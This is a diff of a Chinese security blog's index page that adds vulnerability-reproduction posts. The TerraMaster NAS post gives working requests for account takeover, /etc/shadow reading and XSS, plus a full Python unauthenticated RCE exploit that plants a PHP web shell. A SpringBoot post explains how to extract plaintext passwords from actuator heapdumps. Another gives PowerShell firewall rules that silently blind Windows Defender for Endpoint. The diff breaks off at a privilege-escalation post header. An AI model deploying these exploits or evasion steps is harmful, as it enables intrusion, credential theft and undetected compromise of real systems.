@@ -145,6 +145,99 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E9%93%81%E5%A8%81%E9%A9%ACTerraMaster%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/05/18/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E9%93%81%E5%A8%81%E9%A9%ACTerraMaster%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">铁威马TerraMaster漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-05-18 16:12:00 / Modified: 16:13:24" itemprop="dateCreated datePublished" datetime="2021-05-18T16:12:00+08:00">2021-05-18</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>CVE-2020-28184 – XSS<br>CVE-2020-28185 – User Enumeration<br>CVE-2020-28186 – Email Injection<br>CVE-2020-28187 – Directory Traversal<br>CVE-2020-28188 – Remote Command Execution<br>CVE-2020-28190 – Software Update Man-in-the-middle<br>CVE-2020-29189 – Incorrect Access Control</p>
+<h2 id="Account-Takeover"><a href="#Account-Takeover" class="headerlink" title="Account Takeover"></a><strong>Account Takeover</strong></h2><p>CVE-2020-28186 – The Forget Password functionality was found to be vulnerable to email injection, allowing an attacker to receive a verification code to a third-party email. This attack only works if the user specified a ‘Security email’ on the account.</p>
+<p>The first step is to identify valid account (CVE-2020-28185) with security email set via:</p>
+<p><code>POST /wizard/initialise.php HTTP/1.1&lt;br/&gt;Host: 192.168.1.206:8181&lt;br/&gt;Content-Length: 28&lt;br/&gt;Content-Type: application/x-www-form-urlencoded&lt;br/&gt;Referer: http://192.168.1.206:8181&lt;br/&gt;&lt;br/&gt;tab=checkuser&amp;username=&lt;mark&gt;testaccount&lt;/mark&gt;</code></p>
+<p>The response will look like the following:<br><code>&#123;&quot;username&quot;:&quot;testaccount&quot;,&quot;email&quot;:&quot;&lt;mark&gt;user@local.local&lt;/mark&gt;&quot;,&quot;status&quot;:1&#125;</code></p>
+<p>We can now proceed requesting the password reset code via:</p>
+<p><code>POST /wizard/initialise.php HTTP/1.1&lt;br/&gt;Host: 192.168.1.206:8181&lt;br/&gt;Content-Length: 41&lt;br/&gt;Accept: */*&lt;br/&gt;X-Requested-With: XMLHttpRequest&lt;br/&gt;Content-Type: application/x-www-form-urlencoded&lt;br/&gt;Origin: http://192.168.1.206:8181&lt;br/&gt;Referer: http://192.168.1.206:8181/wizard/getpass.php&lt;br/&gt;Accept-Encoding: gzip, deflate&lt;br/&gt;Accept-Language: en-US,en;q=0.9&lt;br/&gt;Connection: close&lt;br/&gt;&lt;br/&gt;tab=validmail&amp;email=&lt;mark&gt;&lt;valid_user@email&gt;&lt;/mark&gt;,&lt;mark&gt;&lt;attacker_controlled@email&gt;&lt;/mark&gt;</code></p>
+<p>Both user and attacker will receive the verification code thanks to email injection (comma separated emails); At this point we can validate the code (the cookie value must be lowercase):</p>
+<p><code>POST /wizard/initialise.php HTTP/1.1&lt;br/&gt;Host: 192.168.1.206:8181&lt;br/&gt;Content-Length: 25&lt;br/&gt;Accept: /&lt;br/&gt;X-Requested-With: XMLHttpRequest&lt;br/&gt;Content-Type: application/x-www-form-urlencoded&lt;br/&gt;Origin: http://192.168.1.206:8181&lt;br/&gt;Referer: http://192.168.1.206:8181/wizard/getpass.php&lt;br/&gt;Accept-Encoding: gzip, deflate&lt;br/&gt;Accept-Language: en-US,en;q=0.9&lt;br/&gt;Cookie: check_mail=&lt;mark&gt;frskzi&lt;/mark&gt;&lt;br/&gt;Connection: close&lt;br/&gt;&lt;br/&gt;tab=checkcode&amp;code=&lt;mark&gt;FrSkzI&lt;/mark&gt;</code></p>
+<p>And finally reset the user’s password via:</p>
+<p><code>POST /wizard/initialise.php HTTP/1.1&lt;br/&gt;Host: 192.168.1.206:8181&lt;br/&gt;Content-Length: 82&lt;br/&gt;Accept: application/json, text/javascript, */*; q=0.01&lt;br/&gt;X-Requested-With: XMLHttpRequest&lt;br/&gt;Content-Type: application/x-www-form-urlencoded&lt;br/&gt;Origin: http://192.168.1.206:8181&lt;br/&gt;Referer: http://192.168.1.206:8181/wizard/getpass.php&lt;br/&gt;Accept-Encoding: gzip, deflate&lt;br/&gt;Accept-Language: en-US,en;q=0.9&lt;br/&gt;Cookie: check_mail=frskzi&lt;br/&gt;Connection: close&lt;br/&gt;&lt;br/&gt;tab=checkpass&amp;username=testaccount&amp;email=&lt;mark&gt;&lt;valid_user@email&gt;&lt;/mark&gt;&amp;code=&lt;mark&gt;FrSkzI&lt;/mark&gt;&amp;passwd=NewPassw0rdH3r3</code></p>
+<h2 id="Unauthenticated-Remote-Command-Execution"><a href="#Unauthenticated-Remote-Command-Execution" class="headerlink" title="Unauthenticated Remote Command Execution"></a><strong>Unauthenticated Remote Command Execution</strong></h2><p>CVE-2020-28188<br>Vulnerable page: <em>/include/makecvs.php</em><br>Vulnerable parameter: <em>Event</em></p>
+<p>Proof of Concept:<br><code>GET /tos/index.php?explorer/pathList&amp;path=&lt;mark&gt;%60touch%20/tmp/file%60&lt;/mark&gt; HTTP/1.1&lt;br/&gt;Host: 192.168.1.206:8181</code></p>
+<p>Full exploit available：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">import argparse</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">import urllib.parse</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">parser &#x3D; argparse.ArgumentParser(description&#x3D;&quot;TerraMaster TOS &lt;&#x3D; 4.2.06 Unauth RCE&quot;)</span><br><span class="line">parser.add_argument(&#39;--url&#39;, action&#x3D;&#39;store&#39;, dest&#x3D;&#39;url&#39;, required&#x3D;True, help&#x3D;&quot;Full URL and port e.g.: http:&#x2F;&#x2F;192.168.1.111:8081&#x2F;&quot;)</span><br><span class="line">args &#x3D; parser.parse_args()</span><br><span class="line"></span><br><span class="line">url &#x3D; args.url</span><br><span class="line">headers &#x3D; &#123;&#39;User-agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;72.0.3626.121 Safari&#x2F;537.36&#39;&#125;</span><br><span class="line">epoch_time &#x3D; int(time.time())</span><br><span class="line">shell_filename &#x3D; &quot;debug&quot;+str(epoch_time)+&quot;.php&quot;</span><br><span class="line"></span><br><span class="line">def check_endpoint(url, headers):</span><br><span class="line">	response &#x3D; requests.get(url+&#39;&#x2F;version&#39;, headers&#x3D;headers, verify&#x3D;False)</span><br><span class="line">	if response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">		print(&quot;[+] TerraMaster TOS version: &quot;, str(response.content))</span><br><span class="line">	else:</span><br><span class="line">		print(&quot;\n[-] TerraMaster TOS response code: &quot;, response.status_code)</span><br><span class="line">		sys.exit()</span><br><span class="line">		</span><br><span class="line">def upload_shell(url, headers, shell_filename):</span><br><span class="line">	payload &#x3D; &quot;http|echo \&quot;&lt;?php echo(passthru(\\$_GET[&#39;cmd&#39;]));?&gt;\&quot; &gt;&gt; &#x2F;usr&#x2F;www&#x2F;&quot;+shell_filename+&quot; &amp;&amp; chmod +x &#x2F;usr&#x2F;www&#x2F;&quot;+shell_filename+&quot;||&quot;</span><br><span class="line">	payload &#x3D; urllib.parse.quote(payload, safe&#x3D;&#39;&#39;)</span><br><span class="line">	print(&quot;[&#x2F;] Uploading shell...&quot;)</span><br><span class="line">	response &#x3D; requests.get(url+&#39;&#x2F;include&#x2F;makecvs.php?Event&#x3D;&#39;+payload, headers&#x3D;headers, verify&#x3D;False)</span><br><span class="line">	time.sleep(1)</span><br><span class="line">	response &#x3D; requests.get(url+&#39;&#x2F;&#39;+shell_filename+&#39;?cmd&#x3D;id&#39;, headers&#x3D;headers, verify&#x3D;False)</span><br><span class="line">	if (&#39;uid&#x3D;0(root) gid&#x3D;0(root)&#39; in str(response.content, &#39;utf-8&#39;)):</span><br><span class="line">		print(&quot;[+] Upload succeeded&quot;)</span><br><span class="line">	else:</span><br><span class="line">		print(&quot;\n[-] Error uploading shell: &quot;, response.content)</span><br><span class="line">		sys.exit()</span><br><span class="line"></span><br><span class="line">def interactive_shell(url, headers, shell_filename, cmd):</span><br><span class="line">	response &#x3D; requests.get(url+&#39;&#x2F;&#39;+shell_filename+&#39;?cmd&#x3D;&#39;+urllib.parse.quote(cmd, safe&#x3D;&#39;&#39;), headers&#x3D;headers, verify&#x3D;False)</span><br><span class="line">	print(str(response.text)+&quot;\n&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete_shell(url, headers, shell_filename):</span><br><span class="line">	delcmd &#x3D; &quot;rm &#x2F;usr&#x2F;www&#x2F;&quot;+shell_filename</span><br><span class="line">	response &#x3D; requests.get(url+&#39;&#x2F;&#39;+shell_filename+&#39;?cmd&#x3D;&#39;+urllib.parse.quote(delcmd, safe&#x3D;&#39;&#39;), headers&#x3D;headers, verify&#x3D;False)</span><br><span class="line">	print(&quot;\n[+] Shell deleted&quot;)</span><br><span class="line"></span><br><span class="line">check_endpoint(url, headers)</span><br><span class="line">upload_shell(url, headers, shell_filename)</span><br><span class="line">try:</span><br><span class="line">	while True:</span><br><span class="line">		cmd &#x3D; input(&quot;# &quot;)</span><br><span class="line">		interactive_shell(url, headers, shell_filename, cmd)</span><br><span class="line">except:</span><br><span class="line">	delete_shell(url, headers, shell_filename)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Weak-Access-Control-List"><a href="#Weak-Access-Control-List" class="headerlink" title="Weak Access Control List"></a><strong>Weak Access Control List</strong></h2><p>CVE-2020-29189 – When a user is created, it could be placed within a group having read-only access to NAS folders. It was found that this option could be bypassed via the following request:</p>
+<p><code>POST /tos/index.php?explorer/pathChmod HTTP/1.1&lt;br/&gt;Host: 192.168.1.206:8181&lt;br/&gt;Content-Length: 162&lt;br/&gt;Accept: */*&lt;br/&gt;X-Requested-With: XMLHttpRequest&lt;br/&gt;Content-Type: application/x-www-form-urlencoded&lt;br/&gt;Origin: http://192.168.1.206:8181&lt;br/&gt;Referer: http://192.168.1.206:8181/tos/index.php&lt;br/&gt;Accept-Encoding: gzip, deflate&lt;br/&gt;Accept-Language: en-US,en;q=0.9&lt;br/&gt;Cookie: PHPSESSID=9ef919de5a6d2b17f5b6a5549e45495e; tos_visit_time=1604152180; kod_name=testaccount; noshow=1; kod_user_language=it-it&lt;br/&gt;Connection: close&lt;br/&gt;&lt;br/&gt;list=[&#123;&quot;type&quot;:&quot;folder&quot;,&quot;path&quot;:&quot;Volume%2520%25231%252Fpublic%252FISO%252F&quot;,&quot;userlist&quot;:&quot;admin,&lt;mark&gt;testaccount&lt;/mark&gt;,user,@admin,@allusers&quot;,&quot;right&quot;:&quot;2,&lt;mark&gt;2&lt;/mark&gt;,2,2,2&quot;,&quot;appmode&quot;:&quot;0&quot;&#125;]</code></p>
+<p>The ‘right’ array refers to the ‘userlist’ array, therefore a value of ‘2’ will grand read/write access, instead of ‘1’ that only grants read access.</p>
+<h2 id="Directory-Traversal"><a href="#Directory-Traversal" class="headerlink" title="Directory Traversal"></a><strong>Directory Traversal</strong></h2><p>CVE-2020-28187 – Instances of directory traversal leading to internal file system disclosure were identified. For example the following authenticated request can be performed to read the /etc/shadow file:</p>
+<p><code>GET /tos/index.php?editor/fileGet&amp;filename=&lt;mark&gt;../../../../../../etc/shadow&lt;/mark&gt; HTTP/1.1&lt;br/&gt;Host: 192.168.1.206:8181&lt;br/&gt;Accept: application/json, text/javascript, */*; q=0.01&lt;br/&gt;X-Requested-With: XMLHttpRequest&lt;br/&gt;Accept-Encoding: gzip, deflate&lt;br/&gt;Accept-Language: en-US,en;q=0.9&lt;br/&gt;Cookie: PHPSESSID=xxxxxxxxxxxx;&lt;br/&gt;Connection: close</code></p>
+<p>The nginx web server was running with root privileges, that’s why it was possible to read the shadow file.</p>
+<h2 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a><strong>Cross-Site Scripting</strong></h2><p>CVE-2020-28184<br>XSS via Host header on port 80 (unauthenticated)<br><code>GET / HTTP/1.1&lt;br/&gt;Host: 192.168.1.206&#39;-alert(1)-&#39;</code></p>
+<p>Via GET (authenticated)<br><code>GET /module/index.php?mod=%2fusr%2fwww%2fmod%2f5.%22-alert(1)-%22 HTTP/1.1&lt;br/&gt;Host: 192.168.1.206:8181</code></p>
+<h2 id="Software-update-via-insecure-communication-channel"><a href="#Software-update-via-insecure-communication-channel" class="headerlink" title="Software update via insecure communication channel"></a><strong>Software update via insecure communication channel</strong></h2><p>CVE-2020-28190 – In addition, software update and applications are checked and delivered via un-encrypted communication channel (HTTP):<br><code>&quot;AmazonS3&quot;:&lt;br/&gt;&#123;&lt;br/&gt;&quot;url&quot;:&quot;http:\/\/dl.terra-master.com\/cn\/TOS7.0CJ\/AmazonS3.bz2&quot;</code></p>
+<p>This behavior would allow man-in-the-middle attacks to successfully install malicious applications or updates.</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/26/hello-world/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -215,7 +308,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/21/2021-01-21-lanproxy_%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-3019%EF%BC%89POC/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/SpringBoot_%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%B5%8B%E8%AF%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -229,7 +322,605 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2021/01/21/2021-01-21-lanproxy_%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-3019%EF%BC%89POC/" class="post-title-link" itemprop="url">lanproxy 目录遍历漏洞（CVE-2020-3019）POC</a>
+            <a href="/2021/04/06/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/SpringBoot_%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E8%BF%9B%E4%B8%80%E6%AD%A5%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">SpringBoot 未授权漏洞进一步测试</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-04-06 11:30:00 / Modified: 11:39:14" itemprop="dateCreated datePublished" datetime="2021-04-06T11:30:00+08:00">2021-04-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="springboot-框架站点识别"><a href="#springboot-框架站点识别" class="headerlink" title="springboot 框架站点识别"></a>springboot 框架站点识别</h2><h3 id="通过-web-应用程序网页标签的图标（favicon-ico）"><a href="#通过-web-应用程序网页标签的图标（favicon-ico）" class="headerlink" title="通过 web 应用程序网页标签的图标（favicon.ico）"></a>通过 web 应用程序网页标签的图标（favicon.ico）</h3><p>如果 web 应用开发者没有修改 springboot web 应用的默认图标，那么进入应用首页后可以看到如下默认的绿色小图标：<img src="http://www.ha9worm.xyz/usr/uploads/2021/04/2555998028.png" alt="image.png"></p>
+<p>访问：<a href="http://10.1.1.137:8090,可以看到小绿叶图标，说明">http://10.1.1.137:8090,可以看到小绿叶图标，说明</a> web 应用使用的框架为 springboot 框架。</p>
+<h3 id="通过-springboot-框架默认报错页面"><a href="#通过-springboot-框架默认报错页面" class="headerlink" title="通过 springboot 框架默认报错页面"></a>通过 springboot 框架默认报错页面</h3><p>如果 web 应用开发者没有修改 springboot web 应用的默认 4xx、5xx 报错页面，那么当 web 应用程序出现 4xx、5xx 错误时，会报错如下（此处仅以 404 报错页面为例）：</p>
+<p>访问一个随便构造的路径，比如：<a target="_blank" rel="noopener" href="http://10.1.1.137:8090/index%EF%BC%8C%E5%87%BA%E7%8E%B0%E5%A6%82%E4%B8%8B%E6%8A%A5%E9%94%99%E9%A1%B5%E9%9D%A2%E8%AF%B4%E6%98%8E">http://10.1.1.137:8090/index，出现如下报错页面说明</a> web 网站使用了 springboot 框架。<br><img src="http://www.ha9worm.xyz/usr/uploads/2021/04/2326898903.png" alt="image.png"></p>
+<h2 id="Spring-Boot-Actuator-未授权访问"><a href="#Spring-Boot-Actuator-未授权访问" class="headerlink" title="Spring Boot Actuator 未授权访问"></a>Spring Boot Actuator 未授权访问</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;dump - 显示线程转储（包括堆栈跟踪）</span><br><span class="line">&#x2F;heapdump -</span><br><span class="line">&#x2F;autoconfig - 显示自动配置报告</span><br><span class="line">&#x2F;configprops - 显示配置属性</span><br><span class="line">&#x2F;trace - 显示最后几条HTTP消息（可能包含会话标识符）</span><br><span class="line">&#x2F;logfile - 输出日志文件的内容</span><br><span class="line">&#x2F;shutdown - 关闭应用程序</span><br><span class="line">&#x2F;info - 显示应用信息</span><br><span class="line">&#x2F;metrics - 显示当前应用的’指标’信息</span><br><span class="line">&#x2F;health - 显示应用程序的健康指标</span><br><span class="line">&#x2F;beans - 显示Spring Beans的完整列表</span><br><span class="line">&#x2F;mappings - 显示所有MVC控制器映射</span><br><span class="line">&#x2F;env - 提供对配置环境的访问</span><br><span class="line">&#x2F;restart - 重新启动应用程序</span><br></pre></td></tr></table></figure>
+
+<h2 id="heapdump-查找密码"><a href="#heapdump-查找密码" class="headerlink" title="heapdump 查找密码"></a>heapdump 查找密码</h2><p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词 (如 password、secret) 的属性名对应的属性值用 号替换，以达到脱敏的效果。在目标既不出网，/jolokia 接口又没有合适的 MBean 或者不支持 POST 请求的情况下，很多获取被星号脱敏的密码的明文的方法就失效了。这时候就可以利用 Eclipse Memory Analyzer 工具来分析 /heapdump 或 /actuator/heapdump 接口下载的 jvm heap 信息，查找密码明文。</p>
+<p>使用 Eclipse Memory Analyzer 直接打开下载的 heapdump 文件，点击 OQL 标签，在查询框中输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from org.springframework.web.context.support.StandardServletEnvironment</span><br></pre></td></tr></table></figure>
+
+<p>然后点击红色感叹号执行查询。如下图， spring boot 1.x 版本 heapdump 查询结果，最终结果存储在 java.util.Hashtable$Entry 实例的键值对中：<br><img src="http://www.ha9worm.xyz/usr/uploads/2021/04/3073306961.png" alt="image.png"></p>
+<p>所以也可以用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://www.ha9worm.xyz/usr/uploads/2021/04/2590927630.png" alt="image.png"></p>
+<p>来查询。下图为 spring boot 2.x 版本 heapdump 查询结果，最终结果存储在 java.util.LinkedHashMap$Entry 实例的键值对中：</p>
+<p>所以也可以用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>
+
+<p>参考链接：<br><a target="_blank" rel="noopener" href="http://h0sec.com/2020/spring.html">http://h0sec.com/2020/spring.html</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%88%A9%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%E5%B9%B2%E6%8E%89Windows_Defender%E5%91%8A%E8%AD%A6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/02/23/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%88%A9%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%E5%B9%B2%E6%8E%89Windows_Defender%E5%91%8A%E8%AD%A6/" class="post-title-link" itemprop="url">利用防火墙规则干掉Windows Defender告警</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-02-23 12:39:00" itemprop="dateCreated datePublished" datetime="2021-02-23T12:39:00+08:00">2021-02-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-04-06 11:21:11" itemprop="dateModified" datetime="2021-04-06T11:21:11+08:00">2021-04-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>在 Windows 10 和 Windows Server 2019 上禁用 MD for Endpoint 相对来说比较简单，因为我们只需要阻止 MsMpEng、SenseCncProxy 和 MsSense 三个进程在端口 443 上向外发送流量即可。运行以下 PowerShell 脚本将有效地屏蔽 Windows Defender，并且不会触发任何警报：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">New-NetFirewallRule -DisplayName &quot;Block 443 MsMpEng&quot; -Name &quot;Block 443 MsMpEng&quot; -Direction Outbound -Service WinDefend -Enabled True -RemotePort 443 -Protocol TCP -Action Block</span><br><span class="line"></span><br><span class="line">New-NetFirewallRule -DisplayName &quot;Block 443 SenseCncProxy&quot; -Name &quot;Block 443 SenseCncProxy&quot; -Direction Outbound -Program &quot;%ProgramFiles%\Windows Defender Advanced Threat Protection\SenseCncProxy.exe&quot; -RemotePort 443 -Protocol TCP -Action Block</span><br><span class="line"></span><br><span class="line">New-NetFirewallRule -DisplayName &quot;Block 443 MsSense&quot; -Name &quot;Block 443 MsSense&quot; -Direction Outbound -Program &quot;%ProgramFiles%\Windows Defender Advanced Threat Protection\MsSense.exe&quot; -RemotePort 443 -Protocol TCP -Action Block</span><br></pre></td></tr></table></figure>
+
+<p>在 Windows 中添加防火墙规则需要本地管理员权限，因此无法使用低权限用户帐户进行攻击。从以下 Microsoft Defender 安全中心界面来看，一旦应用防火墙规则，就不会收到任何事件。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux_gcore%E6%8F%90%E6%9D%83/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/02/04/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Linux_gcore%E6%8F%90%E6%9D%83/" class="post-title-link" itemprop="url">Linux gcore提权</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-02-04 16:56:00" itemprop="dateCreated datePublished" datetime="2021-02-04T16:56:00+08:00">2021-02-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-05 10:08:40" itemprop="dateModified" datetime="2021-02-05T10:08:40+08:00">2021-02-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
